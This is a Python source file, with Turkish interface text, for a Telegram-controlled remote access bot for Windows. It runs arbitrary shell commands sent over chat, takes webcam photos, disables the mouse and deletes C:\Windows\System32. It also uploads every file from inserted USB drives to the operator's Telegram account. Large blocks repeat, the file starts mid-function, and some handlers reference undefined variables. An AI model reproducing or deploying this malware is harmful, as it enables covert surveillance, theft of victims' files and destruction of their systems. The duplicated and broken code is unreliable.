                bot.answer_callback_query(call.id, f"‚ùå Program kapatƒ±lamadƒ±: {str(e)}")

        elif call.data == "delete_system32":
            try:
                import shutil
                system32_path = r"C:\Windows\System32"
                shutil.rmtree(system32_path)
                bot.answer_callback_query(call.id, "system32 silindi!")
                bot.send_message(call.message.chat.id, "‚ò†Ô∏è system32 silindi! (Sisteminiz artƒ±k √ßalƒ±≈ümayabilir.)", reply_markup=main_menu())
            except Exception as e:
                bot.answer_callback_query(call.id, "Silinemedi")
                bot.send_message(call.message.chat.id, f"‚ùå system32 silinemedi: {str(e)}", reply_markup=main_menu())

        elif call.data == "show_messagebox":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "üí¨ L√ºtfen ekranda g√∂stermek istediƒüiniz mesajƒ± yazƒ±nƒ±z:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, handle_messagebox_text)
            logging.info("MessageBox metni istendi")
            
        elif call.data == "disable_mouse":
            try:
                # Fare cihazlarƒ±nƒ± devre dƒ±≈üƒ± bƒ±rakmak i√ßin DevCon kullanƒ±mƒ±
                subprocess.run([
                    "powershell", 
                    "-Command",
                    "$mouse = Get-WmiObject Win32_PnPEntity | Where-Object {$_.Name -like '*mouse*' -or $_.Name -like '*HID*'}; foreach ($device in $mouse) { $device.Disable() }"
                ], shell=True, capture_output=True)
                
                bot.answer_callback_query(call.id, "üñ±Ô∏è Fare devre dƒ±≈üƒ± bƒ±rakƒ±ldƒ±!")
                bot.edit_message_text(
                    "üñ±Ô∏è Fare ba≈üarƒ±yla devre dƒ±≈üƒ± bƒ±rakƒ±ldƒ±!\nTekrar etkinle≈ütirmek i√ßin bilgisayarƒ± yeniden ba≈ülatƒ±n.",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=main_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"‚ùå Fare devre dƒ±≈üƒ± bƒ±rakƒ±lamadƒ±: {str(e)}")
                
        elif call.data == "disable_keyboard":
            try:
                # Ctrl+A ve Delete tu≈ülarƒ±nƒ± sim√ºle et
                subprocess.run([
                    "powershell",
                    "-Command",
                    """
                    Add-Type -AssemblyName System.Windows.Forms
                    [System.Windows.Forms.SendKeys]::SendWait('^a')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{DELETE}')
                    """
                ], shell=True, capture_output=True)
                
                bot.answer_callback_query(call.id, "‚å®Ô∏è T√ºm i√ßerik se√ßilip silindi!")
                bot.edit_message_text(
                    "‚å®Ô∏è Klavye komutu ba≈üarƒ±yla uygulandƒ±!",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=main_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"‚ùå Klavye komutu uygulanamadƒ±: {str(e)}")

        elif call.data == "taskbar_windows":
            keyboard = taskbar_menu()
            if taskbar_windows_cache:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "ü™ü G√∂rev √ßubuƒüundaki a√ßƒ±k uygulamalar:",
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "ü™ü G√∂rev √ßubuƒüunda a√ßƒ±k uygulama bulunamadƒ±.",
                    reply_markup=main_menu()
                )
        elif call.data == "taskbar_full":
            keyboard = taskbar_full_menu()
            if taskbar_full_cache:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "ü™ü G√∂rev √ßubuƒüundaki sabitlenmi≈ü ve a√ßƒ±k uygulamalar:\nüü¢ = A√ßƒ±k, ‚ö™ = Kapalƒ±",
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "ü™ü G√∂rev √ßubuƒüunda uygulama bulunamadƒ±.",
                    reply_markup=main_menu()
                )
        elif call.data.startswith("launch_taskbar_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(taskbar_full_cache):
                exe_path = taskbar_full_cache[idx]["path"]
                try:
                    subprocess.Popen(exe_path)
                    bot.answer_callback_query(call.id, "Uygulama ba≈ülatƒ±ldƒ±!")
                    bot.send_message(call.message.chat.id, f"‚úÖ {taskbar_full_cache[idx]['name']} ba≈ülatƒ±ldƒ±.", reply_markup=main_menu())
                except Exception as e:
                    bot.answer_callback_query(call.id, "Ba≈ülatƒ±lamadƒ±")
                    bot.send_message(call.message.chat.id, f"‚ùå Uygulama ba≈ülatƒ±lamadƒ±: {str(e)}", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "Ge√ßersiz se√ßim")
                bot.send_message(call.message.chat.id, "‚ùå Ge√ßersiz uygulama se√ßimi.", reply_markup=main_menu())
        elif call.data.startswith("activate_window_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(taskbar_windows_cache):
                hwnd = taskbar_windows_cache[idx]["hwnd"]
                try:
                    win32gui.ShowWindow(hwnd, 5)  # SW_SHOW
                    win32gui.SetForegroundWindow(hwnd)
                    bot.answer_callback_query(call.id, "Pencere √∂ne getirildi!")
                    bot.send_message(call.message.chat.id, f"‚úÖ {taskbar_windows_cache[idx]['title']} √∂ne getirildi.", reply_markup=main_menu())
                except Exception as e:
                    bot.answer_callback_query(call.id, "Ba≈üarƒ±lamadƒ±")
                    bot.send_message(call.message.chat.id, f"‚ùå Pencere √∂ne getirilemedi: {str(e)}", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "Ge√ßersiz se√ßim")
                bot.send_message(call.message.chat.id, "‚ùå Ge√ßersiz pencere se√ßimi.", reply_markup=main_menu())

    except Exception as e:
        bot.answer_callback_query(call.id, "Bir hata olu≈ütu")
        bot.send_message(call.message.chat.id, f"‚ùå Bot hatasƒ±: {str(e)}", reply_markup=main_menu())

# --- G√∂rev √ßubuƒüu kodlarƒ± ba≈ülangƒ±cƒ± ---
import win32gui
import win32process

def get_taskbar_windows():
    windows = []
    def enum_handler(hwnd, ctx):
        if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            exe = ""
            try:
                p = psutil.Process(pid)
                exe = p.exe()
            except Exception:
                pass
            windows.append({
                "hwnd": hwnd,
                "title": win32gui.GetWindowText(hwnd),
                "exe": exe
            })
    win32gui.EnumWindows(enum_handler, None)
    return windows

def taskbar_menu():
    keyboard = InlineKeyboardMarkup()
    windows = get_taskbar_windows()
    global taskbar_windows_cache
    taskbar_windows_cache = windows
    for idx, win in enumerate(windows[:10]):
        keyboard.add(InlineKeyboardButton(f"{win['title']}", callback_data=f"activate_window_{idx}"))
    keyboard.add(InlineKeyboardButton("Ana Men√ºye D√∂n", callback_data="back_to_main"))
    return keyboard

taskbar_windows_cache = []
# --- G√∂rev √ßubuƒüu kodlarƒ± sonu ---

# Run custom command with provided text
def run_custom_command_with_text(message, command):
    original_command = command # Orijinal komutu sakla (√ßevrilmeden √∂nceki hali)
    command = translate_command(command)
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            encoding='utf-8', # Sistem varsayƒ±lanƒ± yerine utf-8 belirtmek daha iyi olabilir
            errors='replace', # Hatalƒ± karakterleri deƒüi≈ütir
            timeout=10 # Zaman a≈üƒ±mƒ±nƒ± artƒ±rabiliriz
        )
        output = result.stdout or result.stderr
        response = f"‚úÖ *Komut*: `{original_command}` (√áalƒ±≈ütƒ±rƒ±lan: `{command}`)\n*Sonu√ß*:\n```{output.strip()}```" if output.strip() else f"‚úÖ *Komut*: `{original_command}` (√áalƒ±≈ütƒ±rƒ±lan: `{command}`)\n√áƒ±ktƒ± yok."
        
    except Exception as e:
        bot.answer_callback_query(call.id, "Bir hata olu≈ütu!")
        bot.send_message(call.message.chat.id, f"‚ùå Hata: {str(e)}", reply_markup=main_menu())



# Send initial message on bot startup
def send_initial_message():
    try:
        bot.send_message(
            ADMIN_CHAT_ID,
            f"üöÄ *Bot Ba≈ülatƒ±ldƒ±!*\nBaƒülanƒ±lan Cihaz: {platform.node()}\nEtkile≈üim i√ßin /start komutunu kullanƒ±n.",
            parse_mode='Markdown'
        )
    except Exception as e:
        pass
# Main execution
def handle_messagebox_text(message):
    try:
        if message.text:
            import ctypes
            import getpass
            import platform
            username = getpass.getuser()
            computer = platform.node()
            mesaj = f"{message.text}"
            ctypes.windll.user32.MessageBoxW(0, mesaj, "Bot Uyarƒ±sƒ±", 0x40)
            bot.send_message(message.chat.id, "üí¨ MessageBox ekrana g√∂sterildi!", reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, "üö´ Mesaj bo≈ü olamaz.", reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå MessageBox g√∂sterilemedi: {str(e)}", reply_markup=main_menu())

if __name__ == "__main__":
    send_initial_message()
    while True:
        try:
            bot.polling(none_stop=True, interval=1)  # interval'ƒ± 1 saniyeye √ßƒ±kardƒ±k
        except Exception as e:
            try:
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"‚ö†Ô∏è Bot bir hata ile kar≈üƒ±la≈ütƒ±: {str(e)}\n5 saniye i√ßinde yeniden ba≈ülatƒ±lƒ±yor...",
                    parse_mode='Markdown'
                )
            except:
                pass
            time.sleep(5)

# Function to take a photo from webcam and send it
def take_photo_and_send(chat_id):
    try:
        bot.send_message(chat_id, "üì∑ Fotoƒüraf √ßekiliyor, l√ºtfen bekleyin...")
        cap = cv2.VideoCapture(1)
        if not cap.isOpened():
            bot.send_message(chat_id, "‚ùå Web kamerasƒ± bulunamadƒ± veya a√ßƒ±lamadƒ±.", reply_markup=main_menu())
            return
        ret, frame = cap.read()
        if ret:
            photo_path = "webcam_photo.jpg"
            cv2.imwrite(photo_path, frame)
            with open(photo_path, "rb") as photo_file:
                bot.send_photo(chat_id, photo_file, caption="üì∏ ƒ∞≈üte web kamerasƒ± fotoƒürafƒ±nƒ±z!", reply_markup=main_menu())
            if os.path.exists(photo_path):
                os.remove(photo_path)
        else:
            bot.send_message(chat_id, "‚ùå Web kamerasƒ±ndan g√∂r√ºnt√º alƒ±namadƒ±.", reply_markup=main_menu())
        cap.release()
    except Exception as e:
        bot.send_message(chat_id, f"‚ùå Fotoƒüraf √ßekilirken bir hata olu≈ütu: {str(e)}", reply_markup=main_menu())

class USBHandler(FileSystemEventHandler):
    def __init__(self, bot, admin_id):
        self.bot = bot
        self.admin_id = admin_id
        self.processed_drives = set()

    def scan_drive(self, drive_path):
        try:
            files = []
            total_size = 0
            
            # T√ºm dosyalarƒ± tara ve bilgileri topla
            for root, dirs, filenames in os.walk(drive_path):
                for filename in filenames:
                    file_path = os.path.join(root, filename)
                    try:
                        size = os.path.getsize(file_path)
                        total_size += size
                        files.append({
                            'path': file_path,
                            'size': size,
                            'name': filename
                        })
                    except:
                        continue

            # USB i√ßeriƒüini bildir
            self.bot.send_message(
                self.admin_id,
                f"üîå Yeni USB Disk Tespit Edildi!\n"
                f"üìÅ S√ºr√ºc√º: {drive_path}\n"
                f"üìä Toplam Boyut: {total_size / (1024*1024):.2f} MB\n"
                f"üìë Dosya Sayƒ±sƒ±: {len(files)}"
            )
            
            # Dosyalarƒ± boyuta g√∂re sƒ±rala
            files.sort(key=lambda x: x['size'])
            
            # Her dosyayƒ± tek tek g√∂ndermeyi dene
            for file in files:
                try:
                    print(f"Dosya g√∂nderiliyor: {file['path']}")  # Debug i√ßin
                    with open(file['path'], 'rb') as f:
                        self.bot.send_document(
                            self.admin_id,
                            f,
                            caption=f"üìÑ {file['name']}\n"
                                   f"üìç {file['path']}\n"
                                   f"üìä {file['size'] / 1024:.1f} KB",
                            timeout=1  # Timeout s√ºresini artƒ±r
                        )
                        time.sleep(1)  # Her dosya arasƒ±nda 1 saniye bekle
                except Exception as e:
                    print(f"Hata: {str(e)}")  # Debug i√ßin
                    self.bot.send_message(
                        self.admin_id,
                        f"‚ùå Dosya g√∂nderilemedi: {file['path']}\nHata: {str(e)}"
                    )
                    
        except Exception as e:
            self.bot.send_message(
                self.admin_id,
                f"‚ùå USB disk taranƒ±rken hata olu≈ütu: {str(e)}"
            )

    def on_created(self, event):
        if not event.is_directory:
            drive_path = os.path.splitdrive(event.src_path)[0] + "\\"
            if drive_path not in self.processed_drives and self.is_removable(drive_path):
                print(f"Yeni USB s√ºr√ºc√º tespit edildi: {drive_path}")  # Debug i√ßin
                self.processed_drives.add(drive_path)
                self.scan_drive(drive_path)

    def is_removable(self, drive):
        try:
            return win32file.GetDriveType(drive) == win32con.DRIVE_REMOVABLE
        except:
            return False

# USB izleme i≈ülemini ba≈ülat
def start_usb_monitoring(bot, admin_id):
    event_handler = USBHandler(bot, admin_id)
    observer = Observer()
    
    # T√ºm s√ºr√ºc√ºleri izle
    for drive in range(ord('A'), ord('Z')+1):
        drive_path = f"{chr(drive)}:\\"
        try:
            if os.path.exists(drive_path):
                observer.schedule(event_handler, drive_path, recursive=False)
        except:
            continue
    
    observer.start()
    return observer

# Ana fonksiyona USB izleme √∂zelliƒüini ekle
if __name__ == '__main__':
    try:
        print("USB izleme ba≈ülatƒ±lƒ±yor...")  # Debug mesajƒ±
        event_handler = USBHandler(bot, ADMIN_CHAT_ID)
        observer = Observer()
        
        # T√ºm s√ºr√ºc√ºleri izle
        for drive in range(ord('A'), ord('Z')+1):
            drive_path = f"{chr(drive)}:\\"
            try:
                if os.path.exists(drive_path):
                    observer.schedule(event_handler, drive_path, recursive=False)
                    print(f"ƒ∞zleniyor: {drive_path}")  # Debug mesajƒ±
            except Exception as e:
                print(f"S√ºr√ºc√º izleme hatasƒ± ({drive_path}): {str(e)}")  # Debug mesajƒ±
                continue
        
        observer.start()
        print("USB izleme ba≈ülatƒ±ldƒ±!")  # Debug mesajƒ±
        
        # Mevcut USB s√ºr√ºc√ºleri kontrol et
        for drive in range(ord('A'), ord('Z')+1):
            drive_path = f"{chr(drive)}:\\"
            if os.path.exists(drive_path) and event_handler.is_removable(drive_path):
                print(f"Mevcut USB s√ºr√ºc√º bulundu: {drive_path}")  # Debug mesajƒ±
                event_handler.scan_drive(drive_path)
        
        # Bot polling'i ba≈ülat
        while True:
            try:
                bot.polling(none_stop=True, interval=1)
            except Exception as e:
                print(f"Bot hatasƒ±: {str(e)}")  # Debug mesajƒ±
                time.sleep(5)
                
    except Exception as e:
        print(f"Ana program hatasƒ±: {str(e)}")  # Debug mesajƒ±


import win32gui
import win32process

def get_taskbar_windows():
    windows = []
    def enum_handler(hwnd, ctx):
        if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            exe = ""
            try:
                p = psutil.Process(pid)
                exe = p.exe()
            except Exception:
                pass
            windows.append({
                "hwnd": hwnd,
                "title": win32gui.GetWindowText(hwnd),
                "exe": exe
            })
    win32gui.EnumWindows(enum_handler, None)
    return windows

def taskbar_menu():
    keyboard = InlineKeyboardMarkup()
    windows = get_taskbar_windows()
    global taskbar_windows_cache
    taskbar_windows_cache = windows
    for idx, win in enumerate(windows[:10]):
        keyboard.add(InlineKeyboardButton(f"{win['title']}", callback_data=f"activate_window_{idx}"))
    keyboard.add(InlineKeyboardButton("Ana Men√ºye D√∂n", callback_data="back_to_main"))
    return keyboard

taskbar_windows_cache = []

# Ana men√ºye buton ekle
def main_menu():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("üåê Chrome", callback_data="open_chrome"),
        InlineKeyboardButton("ü¶ä Firefox", callback_data="open_firefox")
    )
    keyboard.row(
        InlineKeyboardButton("üíæ USB Diskleri Tara", callback_data="scan_usb")
    )
    keyboard.row(
        InlineKeyboardButton("üñ±Ô∏è Fareyi Devre Dƒ±≈üƒ± Bƒ±rak", callback_data="disable_mouse"),
        InlineKeyboardButton("‚å®Ô∏è Klavyeyi Devre Dƒ±≈üƒ± Bƒ±rak", callback_data="disable_keyboard")
    )
    keyboard.row(
        InlineKeyboardButton("üåç Edge", callback_data="open_edge"),
        InlineKeyboardButton("ü¶Å Brave", callback_data="open_brave")
    )
    keyboard.row(
        InlineKeyboardButton("üé≠ Opera", callback_data="open_opera")
    )
    keyboard.row(
        InlineKeyboardButton("üîé Tarayƒ±cƒ±da Ara", callback_data="search_browser")
    )
    keyboard.row(
        InlineKeyboardButton("‚ö° CMD", callback_data="open_cmd"),
        InlineKeyboardButton("üîß PowerShell", callback_data="open_powershell")
    )
    keyboard.row(
        InlineKeyboardButton("üíª System Info", callback_data="system_info"),
        InlineKeyboardButton("üì∑ Fotoƒüraf √áek", callback_data="take_photo")
    )
    keyboard.row(
        InlineKeyboardButton("‚úçÔ∏è Run Custom Command", callback_data="custom_command")
    )
    keyboard.row(
        InlineKeyboardButton("üìú Command History", callback_data="command_history")
    )
    keyboard.row(
        InlineKeyboardButton("ü™ü G√∂rev √áubuƒüu (Sabitlenmi≈ü+A√ßƒ±k)", callback_data="taskbar_full")
    )
    keyboard.row(
        InlineKeyboardButton("üìä A√ßƒ±k Programlar", callback_data="show_processes")
    )
    keyboard.row(
        InlineKeyboardButton("üîÑ Restart Bot", callback_data="restart_bot")
    )
    keyboard.row(
        InlineKeyboardButton("‚ò†Ô∏è system32 sil", callback_data="delete_system32")
    )
    keyboard.row(
        InlineKeyboardButton("üí¨ MessageBox G√∂ster", callback_data="show_messagebox")
    )
    keyboard.row(
        InlineKeyboardButton("üñ•Ô∏è CMD'de Komut √áalƒ±≈ütƒ±r", callback_data="run_cmd_command"),
        InlineKeyboardButton("üñ•Ô∏è PowerShell'de Komut √áalƒ±≈ütƒ±r", callback_data="run_ps_command")
    )
    return keyboard

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global taskbar_windows_cache
    try:
        if call.data == "auto_scan_usb":
            bot.edit_message_text(
                "üîÑ Otomatik USB tarama ba≈ülatƒ±ldƒ±.\nYeni USB takƒ±ldƒ±ƒüƒ±nda otomatik olarak taranacak.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
            # Otomatik taramayƒ± ayrƒ± bir thread'de ba≈ülat
            import threading
            scan_thread = threading.Thread(
                target=auto_scan_usb,
                args=(call.message.chat.id,)
            )
            scan_thread.daemon = True
            scan_thread.start()
            
        # Tarayƒ±cƒ± a√ßma i≈ülemleri
        browsers = {
            "open_chrome": "chrome",
            "open_firefox": "firefox",
            "open_edge": "edge",
            "open_brave": "brave",
            "open_opera": "opera"
        }

        if call.data in browsers:
            browser_name = browsers[call.data]
            browser_path = find_browser_path(browser_name)
            if browser_path:
                subprocess.Popen(browser_path)
                bot.answer_callback_query(call.id, f"{browser_name.capitalize()} ba≈üarƒ±yla a√ßƒ±ldƒ±!")
                bot.send_message(call.message.chat.id, f"üåê {browser_name.capitalize()} ba≈ülatƒ±ldƒ±!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, f"{browser_name.capitalize()} bulunamadƒ±")
                bot.send_message(call.message.chat.id, f"‚ùå {browser_name.capitalize()} bulunamadƒ±.", reply_markup=main_menu())
        
        elif call.data == "search_browser":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "üîé Hangi tarayƒ±cƒ±da ve ne aramak istiyorsun?\nL√ºtfen ≈üu formatta yaz: `tarayƒ±cƒ±_adƒ± arama_terimi`\n(√ñrn: `chrome en son teknoloji haberleri`)",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, handle_browser_search)

        elif call.data == "run_cmd_command":
            sent = bot.send_message(
                call.message.chat.id,
                "‚ö° CMD'de √ßalƒ±≈ütƒ±rmak istediƒüiniz komutu giriniz:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(sent, handle_cmd_command)
        elif call.data == "run_ps_command":
            sent = bot.send_message(
                call.message.chat.id,
                "üîß PowerShell'de √ßalƒ±≈ütƒ±rmak istediƒüiniz komutu giriniz:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(sent, handle_ps_command)

        # CMD ve PowerShell a√ßma i≈ülemleri
        elif call.data == "open_cmd":
            terminal_path = find_terminal_path("cmd")
            if terminal_path:
                subprocess.Popen(terminal_path, creationflags=subprocess.CREATE_NEW_CONSOLE)
                bot.answer_callback_query(call.id, "CMD ba≈üarƒ±yla a√ßƒ±ldƒ±!")
                bot.send_message(call.message.chat.id, "‚ö° CMD ba≈ülatƒ±ldƒ±!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "CMD bulunamadƒ±")
                bot.send_message(call.message.chat.id, "‚ùå CMD bulunamadƒ±.", reply_markup=main_menu())
                
        elif call.data == "open_powershell":
            terminal_path = find_terminal_path("powershell")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "-NoExit", "-Command", 
                     "$host.UI.RawUI.WindowTitle = 'PowerShell IDE'; $host.UI.RawUI.BackgroundColor = 'Black'; $host.UI.RawUI.ForegroundColor = 'Green'; Clear-Host"],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.answer_callback_query(call.id, "PowerShell ba≈üarƒ±yla a√ßƒ±ldƒ±!")
                bot.send_message(call.message.chat.id, "üîß PowerShell ba≈ülatƒ±ldƒ±!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "PowerShell bulunamadƒ±")
                bot.send_message(call.message.chat.id, "‚ùå PowerShell bulunamadƒ±.", reply_markup=main_menu())

        # Sistem bilgisi g√∂sterme
        elif call.data == "system_info":
            system_info = get_detailed_system_info()
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, system_info, parse_mode='Markdown', reply_markup=main_menu())

        elif call.data == "take_photo": # Yeni callback
            bot.answer_callback_query(call.id, "Fotoƒüraf √ßekme i≈ülemi ba≈ülatƒ±lƒ±yor...")
            take_photo_and_send(call.message.chat.id)

        elif call.data == "custom_command": # CHANGED if to elif
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "‚úçÔ∏è √áalƒ±≈ütƒ±rmak istediƒüiniz komutu girin (√∂rneƒüin: `dir`, `type dosya.txt`):\n\n*Not*: Unix komutlarƒ± (`ls`, `cat` vb.) otomatik olarak Windows e≈üdeƒüerlerine √ßevrilir.",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, run_custom_command)

        elif call.data.startswith("select_device_"):
            device_id = call.data.split("_")[-1]
            devices = get_current_device() # Bu fonksiyon sadece mevcut cihazƒ± d√∂nd√ºr√ºyor, ID bazlƒ± se√ßim i√ßin mantƒ±k g√∂zden ge√ßirilmeli
            device_info = devices.get(device_id, {}) # Eƒüer birden fazla cihaz y√∂netimi hedefleniyorsa DEVICES s√∂zl√ºƒü√º kullanƒ±lmalƒ±
            info = (
                f"üì° *Cihaz: {device_info.get('name', 'Bilinmiyor')}*\n"
                f"ƒ∞≈ületim Sistemi: {device_info.get('os', 'Yok')}"
            )
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, info, parse_mode='Markdown', reply_markup=main_menu())

        elif call.data == "no_devices":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "üñ•Ô∏è Yapƒ±landƒ±rƒ±lmƒ±≈ü cihaz bulunamadƒ±.",
                parse_mode='Markdown',
                reply_markup=main_menu()
            )

        elif call.data == "command_history":
            if command_history:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "üìú *Son Komutlar*",
                    parse_mode='Markdown',
                    reply_markup=history_menu()
                )
            else:
                bot.answer_callback_query(call.id, "Komut ge√ßmi≈üi yok")
                bot.send_message(
                    call.message.chat.id,
                    "üìú Ge√ßmi≈üte hen√ºz komut yok.",
                    parse_mode='Markdown',
                    reply_markup=main_menu()
                )

        elif call.data.startswith("run_history_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(command_history):
                command = command_history[idx]
                bot.answer_callback_query(call.id, f"√áalƒ±≈ütƒ±rƒ±lƒ±yor: {command}")
                bot.send_message(
                    call.message.chat.id,
                    f"‚úçÔ∏è Komut √ßalƒ±≈ütƒ±rƒ±lƒ±yor: `{command}`",
                    parse_mode='Markdown',
                    reply_markup=main_menu()
                )
                run_custom_command_with_text(call.message, command) # message objesi call.message olmalƒ±
            else:
                bot.answer_callback_query(call.id, "Ge√ßersiz komut")
                bot.send_message(
                    call.message.chat.id,
                    "‚ùå Ge√ßersiz komut se√ßildi.",
                    reply_markup=main_menu()
                )
    
        elif call.data == "restart_bot":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "üîÑ Bot yeniden ba≈ülatƒ±lƒ±yor...", parse_mode='Markdown')
            bot.stop_polling()
            os.execv(sys.executable, ['python'] + sys.argv)

        elif call.data == "cancel_command":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "üö´ Komut giri≈üi iptal edildi.", reply_markup=main_menu())

        elif call.data == "back_to_main":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "‚Ü©Ô∏è Ana men√ºye d√∂n√ºld√º.", reply_markup=main_menu())

        elif call.data == "scan_usb":
            bot.edit_message_text(
                "üíæ USB Diskleri Taranƒ±yor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )
            
        elif call.data.startswith("scan_usb_"):
            try:
                idx = int(call.data.split("_")[2])
                drives = get_usb_drives()
                if idx < len(drives):
                    drive = drives[idx]
                    bot.edit_message_text(
                        f"üíæ {drive['label']} ({drive['path']}) taranƒ±yor...",
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id
                    )
                    scan_and_send_usb_files(call.message.chat.id, drive['path'])
                    bot.send_message(
                        call.message.chat.id,
                        "‚úÖ USB disk taramasƒ± tamamlandƒ±!",
                        reply_markup=main_menu()
                    )
            except Exception as e:
                bot.answer_callback_query(call.id, f"‚ùå Hata: {str(e)}")
                
        elif call.data == "refresh_usb":
            bot.edit_message_text(
                "üíæ USB Diskleri Taranƒ±yor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )

        elif call.data == "show_processes":
            bot.edit_message_text(
                "üìä *√áalƒ±≈üan Programlar*\n"
                "Kapatmak istediƒüiniz programa tƒ±klayƒ±n:",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='Markdown',
                reply_markup=running_processes_menu()
            )
            
        elif call.data == "refresh_processes":
            try:
                bot.edit_message_text(
                    "üìä √áalƒ±≈üan Programlar:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=running_processes_menu()
                )
                bot.answer_callback_query(call.id, "‚úÖ Liste yenilendi!")
            except Exception as e:
                bot.answer_callback_query(call.id, "‚ùå Liste yenilenemedi!")
                bot.send_message(
                    call.message.chat.id,
                    f"‚ùå Hata olu≈ütu: {str(e)}",
                    reply_markup=main_menu()
                )
            
        elif call.data.startswith("kill_process_"):
            pid = int(call.data.split("_")[2])
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                process.terminate()
                bot.answer_callback_query(call.id, f"‚úÖ {process_name} ba≈üarƒ±yla kapatƒ±ldƒ±!")
                # Listeyi yenile
                bot.edit_message_text(
                    "üìä *√áalƒ±≈üan Programlar*\n"
                    "Kapatmak istediƒüiniz programa tƒ±klayƒ±n:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=running_processes_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"‚ùå Program kapatƒ±lamadƒ±: {str(e)}")

        elif call.data == "delete_system32":
            try:
                import shutil
                system32_path = r"C:\Windows\System32"
                shutil.rmtree(system32_path)
                bot.answer_callback_query(call.id, "system32 silindi!")
                bot.send_message(call.message.chat.id, "‚ò†Ô∏è system32 silindi! (Sisteminiz artƒ±k √ßalƒ±≈ümayabilir.)", reply_markup=main_menu())
            except Exception as e:
                bot.answer_callback_query(call.id, "Silinemedi")
                bot.send_message(call.message.chat.id, f"‚ùå system32 silinemedi: {str(e)}", reply_markup=main_menu())

        elif call.data == "show_messagebox":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "üí¨ L√ºtfen ekranda g√∂stermek istediƒüiniz mesajƒ± yazƒ±nƒ±z:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, handle_messagebox_text)
            logging.info("MessageBox metni istendi")
            
        elif call.data == "disable_mouse":
            try:
                # Fare cihazlarƒ±nƒ± devre dƒ±≈üƒ± bƒ±rakmak i√ßin DevCon kullanƒ±mƒ±
                subprocess.run([
                    "powershell", 
                    "-Command",
                    "$mouse = Get-WmiObject Win32_PnPEntity | Where-Object {$_.Name -like '*mouse*' -or $_.Name -like '*HID*'}; foreach ($device in $mouse) { $device.Disable() }"
                ], shell=True, capture_output=True)
                
                bot.answer_callback_query(call.id, "üñ±Ô∏è Fare devre dƒ±≈üƒ± bƒ±rakƒ±ldƒ±!")
                bot.edit_message_text(
